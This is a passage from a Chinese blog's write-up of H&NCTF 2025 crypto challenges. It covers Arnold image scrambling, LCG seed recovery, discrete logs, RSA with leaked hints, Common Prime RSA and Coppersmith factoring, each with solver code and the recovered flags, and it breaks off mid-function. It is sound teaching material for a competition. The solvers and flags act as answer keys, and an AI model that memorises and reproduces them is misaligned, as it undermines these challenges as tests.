      <link href="/2025/06/10/H-NCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteUP/"/>
      <url>/2025/06/10/H-NCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>一个人奋战半天拿了个第41，Crypto也没AK，遗憾退场</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610002105365.png" /></p><h2 id="crypto">Crypto</h2><h3 id="哈基coke">哈基coke</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt  </span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_encode</span>(<span class="params">image, shuffle_times, a, b</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Arnold shuffle for rgb image  </span></span><br><span class="line"><span class="string">    Args:        </span></span><br><span class="line"><span class="string">    image: input original rgb image        </span></span><br><span class="line"><span class="string">    shuffle_times: how many times to shuffle    </span></span><br><span class="line"><span class="string">    Returns:        </span></span><br><span class="line"><span class="string">    Arnold encode image   </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>    </span><br><span class="line">    arnold_image = np.zeros(shape=image.shape)  </span><br><span class="line">  </span><br><span class="line">    h, w = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]  </span><br><span class="line">    N = h  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):  </span><br><span class="line">        <span class="keyword">for</span> ori_x <span class="keyword">in</span> <span class="built_in">range</span>(h):  </span><br><span class="line">            <span class="keyword">for</span> ori_y <span class="keyword">in</span> <span class="built_in">range</span>(w):  </span><br><span class="line">  </span><br><span class="line">                new_x = (<span class="number">1</span>*ori_x + b*ori_y)% N  </span><br><span class="line">                new_y = (a*ori_x + (a*b+<span class="number">1</span>)*ori_y) % N  </span><br><span class="line">  </span><br><span class="line">                arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :]  </span><br><span class="line">  </span><br><span class="line">        image = np.copy(arnold_image)  </span><br><span class="line">  </span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;en_flag.png&#x27;</span>, arnold_image, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])  </span><br><span class="line">    <span class="keyword">return</span> arnold_image  </span><br><span class="line">  </span><br><span class="line">img = cv2.imread(<span class="string">&#x27;coke.png&#x27;</span>)  </span><br><span class="line">arnold_encode(img,<span class="number">6</span>,<span class="number">9</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>Arnold变换，可以编写如下代码进行求解： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt  </span><br><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np  </span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image, shuffle_times, a, b</span>):  </span><br><span class="line">    decoded_image = np.copy(image)  </span><br><span class="line">    h, w = image.shape[<span class="number">0</span>], image.shape[<span class="number">1</span>]  </span><br><span class="line">    N = h  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):  </span><br><span class="line">        new_image = np.zeros_like(decoded_image)  </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(h):  </span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(w):  </span><br><span class="line">                ori_x = ((a * b + <span class="number">1</span>) * x - b * y) % N  </span><br><span class="line">                ori_y = (-a * x + <span class="number">1</span> * y) % N  </span><br><span class="line">                new_image[ori_x, ori_y, :] = decoded_image[x, y, :]  </span><br><span class="line">        decoded_image = np.copy(new_image)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> decoded_image  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">encrypted_img = cv2.imread(<span class="string">&#x27;en_flag.png&#x27;</span>)  </span><br><span class="line">decrypted_img = arnold_decode(encrypted_img, shuffle_times=<span class="number">6</span>, a=<span class="number">9</span>, b=<span class="number">1</span>)  </span><br><span class="line">cv2.imwrite(<span class="string">&#x27;decrypted_flag.png&#x27;</span>, decrypted_img, [<span class="built_in">int</span>(cv2.IMWRITE_PNG_COMPRESSION), <span class="number">0</span>])</span><br></pre></td></tr></table></figure> 可以解出如下图片：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003305415.png" alt="decrypted_flag" /><figcaption>decrypted_flag</figcaption></figure><p>那么可以得到flag：<code>H&amp;NCTF&#123;haji_coke_you_win&#125;</code></p><h3 id="lcgp">lcgp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line">n = getPrime(<span class="number">1024</span>)  </span><br><span class="line">flag = <span class="string">b&#x27;H&amp;NCTF&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span>  </span><br><span class="line">flag=bytes_to_long(flag)  </span><br><span class="line">e = <span class="number">2024</span>  </span><br><span class="line">c=<span class="built_in">pow</span>(e, flag, n)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b, m</span>):  </span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = m  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):  </span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m  </span><br><span class="line">        <span class="keyword">return</span> self.seed  </span><br><span class="line">  </span><br><span class="line">lcg = LCG(c, getPrime(<span class="number">256</span>), getPrime(<span class="number">256</span>), getPrime(<span class="number">2048</span>))  </span><br><span class="line">random = [lcg.generate() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(random)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br></pre></td></tr></table></figure><p>一个套着LCG壳子的离散对数问题，需要先通过恢复参数倒推种子的方式来得到密文，可以通过<a href="https://triodelzx.github.io/2023/12/17/LCG%E7%AC%94%E8%AE%B0/">LCG笔记 | Triode Field</a>所讲述的方法来倒推参数得到<code>seed</code>，在此之后求离散对数即可得到flag：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = [...] <span class="comment"># 题目给出的random</span></span><br><span class="line">n = ...</span><br><span class="line"></span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t.append(s[i+<span class="number">1</span>]-s[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>):</span><br><span class="line">    p = gcd(t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>],t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i])</span><br><span class="line">    a = (s[<span class="number">2</span>]-s[<span class="number">1</span>])*inverse(s[<span class="number">1</span>]-s[<span class="number">0</span>],p)%p</span><br><span class="line">    b = (s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%p</span><br><span class="line">    seed = (s[<span class="number">0</span>] - b) * inverse(a, p) % p</span><br><span class="line">    R = GF(n)</span><br><span class="line">    c = R(seed)</span><br><span class="line">    base = R(<span class="number">2024</span>)</span><br><span class="line">    flag = c.log(base)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><p>可以得到flag：<code>H&amp;NCTF&#123;7ecf4c8c-e6a5-45c7-b7de-2fecc31d8511&#125;</code></p><h3 id="数据处理">数据处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line">flag = <span class="string">b&quot;H&amp;NCTF&#123;&#125;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">btl = <span class="built_in">str</span>(bytes_to_long(flag))  </span><br><span class="line">lowercase = <span class="string">&#x27;0123456789&#x27;</span> </span><br><span class="line">uppercase = <span class="string">&#x27;7***4****5&#x27;</span>   </span><br><span class="line">table = <span class="string">&#x27;&#x27;</span>.maketrans(lowercase, uppercase)   </span><br><span class="line">  </span><br><span class="line">new_flag = btl.translate(table)  </span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span>  </span><br><span class="line">  </span><br><span class="line">m = random.randint(<span class="number">2</span>, n - <span class="number">1</span>) | <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="built_in">int</span>(new_flag), n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;m = &#x27;</span> + <span class="built_in">str</span>(m))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))  </span><br><span class="line"><span class="comment"># m = 5084057673176634704877325918195984684237263100965172410645544705367004138917087081637515846739933954602106965103289595670550636402101057955537123475521383  </span></span><br><span class="line"><span class="comment"># c = 2989443482952171039348896269189568991072039347099986172010150242445491605115276953489889364577445582220903996856271544149424805812495293211539024953331399</span></span><br></pre></td></tr></table></figure><p>一个简单的离散对数问题，但是密文是经过换表的（本质上是一个置换），而且置换后表也只知道其中三个数字，所以可以知道这个置换如下： <span class="math display">\[\left(\begin{matrix}0&amp;1&amp;2&amp;3&amp;4&amp;5&amp;6&amp;7&amp;8&amp;9\\7&amp;*&amp;*&amp;*&amp;4&amp;*&amp;*&amp;*&amp;*&amp;5\end{matrix}\right)\]</span> 那么需要通过爆破所有可能的置换来尝试还原得到flag：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">m = <span class="number">5084057673176634704877325918195984684237263100965172410645544705367004138917087081637515846739933954602106965103289595670550636402101057955537123475521383</span></span><br><span class="line">c = <span class="number">2989443482952171039348896269189568991072039347099986172010150242445491605115276953489889364577445582220903996856271544149424805812495293211539024953331399</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span>^<span class="number">512</span></span><br><span class="line">R = Zmod(n)</span><br><span class="line"></span><br><span class="line">trans_flag = R(c).log(m)</span><br><span class="line">tmp = <span class="built_in">str</span>(trans_flag)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(ZZ(m), ZZ(trans_flag), n) == c</span><br><span class="line"></span><br><span class="line">alpha = <span class="string">&quot;0123689&quot;</span></span><br><span class="line">per = permutations(alpha)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> per:</span><br><span class="line">    now_table = <span class="string">f&#x27;7<span class="subst">&#123;p[<span class="number">0</span>]&#125;</span><span class="subst">&#123;p[<span class="number">1</span>]&#125;</span><span class="subst">&#123;p[<span class="number">2</span>]&#125;</span>4<span class="subst">&#123;p[<span class="number">3</span>]&#125;</span><span class="subst">&#123;p[<span class="number">4</span>]&#125;</span><span class="subst">&#123;p[<span class="number">5</span>]&#125;</span><span class="subst">&#123;p[<span class="number">6</span>]&#125;</span>5&#x27;</span></span><br><span class="line">    old_table = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line">    table = <span class="built_in">str</span>.maketrans(now_table, old_table)</span><br><span class="line"></span><br><span class="line">    pos_flag = tmp.translate(table)</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(pos_flag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;H&amp;NCTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可以得到flag：<code>H&amp;NCTF&#123;cut_cut_rrioajtfijrwegeriogjiireigji&#125;</code></p><h3 id="为什么出题人的rsa总是ez">为什么出题人的rsa总是ez</h3><p>代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#part 1  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">flag, bits=<span class="number">1024</span></span>):  </span><br><span class="line">    pad = os.urandom(bits//<span class="number">8</span> - <span class="built_in">len</span>(flag))  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(flag + pad, <span class="string">&quot;big&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">p = random_prime(<span class="number">2</span>**<span class="number">1024</span>)  </span><br><span class="line">q = random_prime(<span class="number">2</span>**<span class="number">1024</span>)  </span><br><span class="line">a = randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">1024</span>)  </span><br><span class="line">b = randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">1024</span>)  </span><br><span class="line">n = p * q  </span><br><span class="line">e = <span class="number">0x10001</span>  </span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span>  </span><br><span class="line">m = pad(flag)  </span><br><span class="line"><span class="keyword">assert</span> m &lt; n  </span><br><span class="line">  </span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h1=<span class="subst">&#123;p + b * q&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h2=<span class="subst">&#123;a * p + q&#125;</span>&quot;</span>)  </span><br><span class="line"><span class="comment"># c=...  </span></span><br><span class="line"><span class="comment"># n=...  </span></span><br><span class="line"><span class="comment"># h1=...  </span></span><br><span class="line"><span class="comment"># h2=...  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#part 2  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *  </span><br><span class="line">a = random_prime()  </span><br><span class="line">b = random_prime()  </span><br><span class="line">g = random_prime()  </span><br><span class="line">h = <span class="number">2</span>*g*a*b+a+b  </span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_prime(h):  </span><br><span class="line">    a = random_prime()  </span><br><span class="line">    b = random_prime()  </span><br><span class="line">    g = random_prime()  </span><br><span class="line">    h = <span class="number">2</span>*g*a*b+a+b  </span><br><span class="line">N = <span class="number">2</span>*h*g+<span class="number">1</span>  </span><br><span class="line"><span class="comment"># e from part1&#x27;s flag  </span></span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span>  </span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag),e,N)  </span><br><span class="line"><span class="built_in">print</span>(N)  </span><br><span class="line"><span class="built_in">print</span>(g)  </span><br><span class="line"><span class="built_in">print</span>(c)  </span><br><span class="line"><span class="comment">#N=...  </span></span><br><span class="line"><span class="comment">#g=...  </span></span><br><span class="line"><span class="comment">#c=...</span></span><br></pre></td></tr></table></figure></p><h4 id="第一部分">第一部分</h4><p>给了<span class="math inline">\(h_1=ap+q\)</span>和<span class="math inline">\(h_2=p+bq\)</span>，参考<a href="https://connor-mccartney.github.io/cryptography/rsa/BLAHAJ-angstrom-CTF-2024">BLAHAJ - angstrom CTF 2024 - Connor M</a>可以知道<span class="math inline">\(qh_1 + ph_2 - h_1h_2=0\)</span>，用如下脚本即可解出第一部分（参考了前面的文章说到的脚本）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(<span class="string">&#x27;https://gist.githubusercontent.com/Connor-McCartney/952583ecac836f843f50b785c7cb283d/raw/5718ebd8c9b4f9a549746094877a97e7796752eb/solvelinmod.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line">var(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">bounds = &#123;p: <span class="number">2</span>**<span class="number">1024</span>, q: <span class="number">2</span>**<span class="number">1024</span>&#125;</span><br><span class="line">eqs = [(q*h1 + p*h2 - h1*h2==<span class="number">0</span>, n)]</span><br><span class="line">sol = solve_linear_mod(eqs, bounds)</span><br><span class="line">p = sol[p]</span><br><span class="line">q = sol[q]</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p>可以得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;e_is_xevaf-cityf-fisof-ketaf-metaf-disef-nuvaf-cysuf-dosuf-getuf-cysuf-dasix,bubbleBabble&#125;</span><br></pre></td></tr></table></figure> 这显然不是flag，因为第二部分要用第一部分得到的<span class="math inline">\(e\)</span>，而这里给出了bubbleBabble编码后的<span class="math inline">\(e\)</span>，解码可以得到：</p><p><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250610003254588.png" /></p><h4 id="第二部分">第二部分</h4><p>给出质数<span class="math inline">\(g\)</span>，有<span class="math inline">\(h=2gab+a+b\)</span>，<span class="math inline">\(N=2hg+1\)</span>，显然这是Common Prime RSA，参考<a href="https://hasegawaazusa.github.io/common-prime-rsa.html?highlight=common+prime#%E5%B7%B2%E7%9F%A5-g">Common Prime RSA 笔记 | 独奏の小屋</a>可以得到如下代码求解出flag： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = ...</span><br><span class="line">g = ...</span><br><span class="line">ct = ... <span class="comment"># 密文</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.groups.generic <span class="keyword">import</span> bsgs</span><br><span class="line"></span><br><span class="line">e = <span class="number">81733668723981020451323</span></span><br><span class="line"></span><br><span class="line">h = (N - <span class="number">1</span>) // (<span class="number">2</span>*g)</span><br><span class="line"></span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">gamma = RR(g.bit_length() / nbits)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gamma:&quot;</span>, gamma)</span><br><span class="line">cbits = ceil(nbits * (<span class="number">0.5</span> - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">M = (N - <span class="number">1</span>) // (<span class="number">2</span> * g)</span><br><span class="line">u = M // (<span class="number">2</span> * g)</span><br><span class="line">v = M - <span class="number">2</span> * g * u</span><br><span class="line">GF = Zmod(N)</span><br><span class="line">x = GF.random_element()</span><br><span class="line">y = x ^ (<span class="number">2</span> * g)</span><br><span class="line">c = bsgs(y, y ^ u, (ZZ(<span class="number">2</span>**(cbits-<span class="number">1</span>)), ZZ(<span class="number">2</span>**(cbits+<span class="number">1</span>))))</span><br><span class="line">ab = u - c</span><br><span class="line">apb = v + <span class="number">2</span> * g * c</span><br><span class="line">P.&lt;x&gt; = ZZ[]</span><br><span class="line">f = x ^ <span class="number">2</span> - apb * x + ab</span><br><span class="line">a = f.roots()</span><br><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a, b = a[<span class="number">0</span>][<span class="number">0</span>], a[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    p = <span class="number">2</span> * g * a + <span class="number">1</span></span><br><span class="line">    q = <span class="number">2</span> * g * b + <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> p * q == N</span><br><span class="line"></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(ct, d, N)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure> 可以解出flag：<code>flag&#123;I wish you success in your cryptography career&#125;</code></p><h3 id="ez-factor">ez-factor</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> uuid  </span><br><span class="line">  </span><br><span class="line">rbits = <span class="number">248</span>  </span><br><span class="line">Nbits = <span class="number">1024</span>  </span><br><span class="line">  </span><br><span class="line">p = getPrime(Nbits // <span class="number">2</span>)  </span><br><span class="line">q = getPrime(Nbits // <span class="number">2</span>)  </span><br><span class="line">N = p * q  </span><br><span class="line">r = getPrime(rbits)  </span><br><span class="line">hint = getPrime(Nbits // <span class="number">2</span>) * p + r  </span><br><span class="line">R = <span class="number">2</span>^rbits  </span><br><span class="line">e=<span class="number">0x10001</span>  </span><br><span class="line">n=p*q  </span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)  </span><br><span class="line">flag = <span class="string">b&#x27;H&amp;NCTF&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode() + <span class="string">b&#x27;&#125;&#x27;</span>  </span><br><span class="line">m=bytes_to_long(flag)  </span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N=&quot;</span>,N)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint=&quot;</span>,hint)  </span><br><span class="line"><span class="built_in">print</span>(c)  </span><br><span class="line">N = ...  </span><br><span class="line">hint = ...  </span><br><span class="line">c = ...</span><br></pre></td></tr></table></figure><p>有<span class="math inline">\(hint=kp+r\)</span>（其中<span class="math inline">\(k\)</span>是一个512位质数，<span class="math inline">\(r\)</span>是一个248位质数），因为<span class="math inline">\(r\)</span>很小，考虑构造多项式<span class="math inline">\(f=hint-x\)</span>进行Coppersmith方法，使用参数<span class="math inline">\(X=2^{248},\beta=0.4,\varepsilon=0.01\)</span>时可以求出一个小根<span class="math inline">\(r\)</span>，这个小根即为<span class="math inline">\(r\)</span>，从而可以得到<span class="math inline">\(p=(hint-r,N)\)</span>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = ...</span><br><span class="line">hint = ...</span><br><span class="line">c = ...</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(N)[]</span><br><span class="line"></span><br><span class="line">f = hint - x</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">r = f.small_roots(X = <span class="number">2</span>^<span class="number">248</span>, beta = <span class="number">0.4</span>, epsilon = <span class="number">0.01</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p = gcd(hint - r, N)</span><br><span class="line">q = N // p</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="ez-factor-pro">ez-factor-pro</h3><blockquote><p>这道题其实是赛后才看的</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> gmssl.sm4 <span class="keyword">import</span> CryptSM4, SM4_ENCRYPT  </span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> uuid  </span><br><span class="line">rbits = <span class="number">252</span>  </span><br><span class="line">Nbits = <span class="number">1024</span>  </span><br><span class="line">  </span><br><span class="line">p = getPrime(Nbits//<span class="number">2</span>)  </span><br><span class="line">q = getPrime(Nbits//<span class="number">2</span>)  </span><br><span class="line">N = p*q  </span><br><span class="line">r = getPrime(rbits)  </span><br><span class="line">hint = getPrime(Nbits// <span class="number">2</span>)*p+r  </span><br><span class="line">R = <span class="number">2</span>^rbits  </span><br><span class="line">flag = <span class="string">b&#x27;H&amp;NCTF&#123;&#x27;</span>+<span class="built_in">str</span>(uuid.uuid4()).encode()+<span class="string">b&#x27;&#125;&#x27;</span>  </span><br><span class="line">leak=p*q*r  </span><br><span class="line">r_bytes = long_to_bytes(leak)  </span><br><span class="line">iv = r_bytes[:<span class="number">16</span>] <span class="keyword">if</span> <span class="built_in">len</span>(r_bytes) &gt;= <span class="number">16</span> <span class="keyword">else</span> r_bytes + <span class="string">b&#x27;\0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(r_bytes))  </span><br><span class="line">key = sha256(<span class="built_in">str</span>(p + q + r).encode()).digest()[:<span class="number">16</span>]   </span><br><span class="line">crypt_sm4 = CryptSM4()  </span><br><span class="line">crypt_sm4.set_key(key, SM4_ENCRYPT)  </span><br><span class="line">padded_flag = pad(flag, <span class="number">16</span>)  </span><br><span class="line">c = crypt_sm4.crypt_cbc(iv, padded_flag)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N=&quot;</span>,N)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint=&quot;</span>,hint)  </span><br><span class="line"><span class="built_in">print</span>(c)  </span><br></pre></td></tr></table></figure><p>跟上一题差不多，就是<span class="math inline">\(r\)</span>更大了，直接Coppersmith没办法搞出来，需要考虑爆破一下<span class="math inline">\(r\)</span>的高位，按上一题来看的话爆破4位就行了，但是直接用sage自带的<code>small_roots</code>太慢了，考虑用flatter加速一下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> gmssl.sm4 <span class="keyword">import</span> CryptSM4, SM4_DECRYPT</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">N = ...</span><br><span class="line">hint = ...</span><br><span class="line">c = <span class="string">&quot;...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flatter</span>(<span class="params">M</span>):  </span><br><span class="line">    <span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output  </span><br><span class="line">    <span class="keyword">from</span> re <span class="keyword">import</span> findall  </span><br><span class="line">    <span class="keyword">global</span> count  </span><br><span class="line">    <span class="comment"># compile https://github.com/keeganryan/flatter and put it in $PATH  </span></span><br><span class="line">    z = <span class="string">&quot;[[&quot;</span> + <span class="string">&quot;]\n[&quot;</span>.join(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, row)) <span class="keyword">for</span> row <span class="keyword">in</span> M) + <span class="string">&quot;]]&quot;</span>  </span><br><span class="line">    ret = check_output([<span class="string">&quot;flatter&quot;</span>], <span class="built_in">input</span>=z.encode())  </span><br><span class="line">    <span class="keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="built_in">map</span>(<span class="built_in">int</span>, findall(<span class="string">b&quot;-?\\d+&quot;</span>, ret)))  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">self, X=<span class="literal">None</span>, beta=<span class="number">1.0</span>, epsilon=<span class="literal">None</span>, **kwds</span>):  </span><br><span class="line">    <span class="keyword">from</span> sage.misc.verbose <span class="keyword">import</span> verbose  </span><br><span class="line">    <span class="keyword">from</span> sage.matrix.constructor <span class="keyword">import</span> Matrix  </span><br><span class="line">    <span class="keyword">from</span> sage.rings.real_mpfr <span class="keyword">import</span> RR  </span><br><span class="line">  </span><br><span class="line">    N = self.parent().characteristic()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.is_monic():  </span><br><span class="line">        <span class="keyword">raise</span> ArithmeticError(<span class="string">&quot;Polynomial must be monic.&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    beta = RR(beta)  </span><br><span class="line">    <span class="keyword">if</span> beta &lt;= <span class="number">0.0</span> <span class="keyword">or</span> beta &gt; <span class="number">1.0</span>:  </span><br><span class="line">        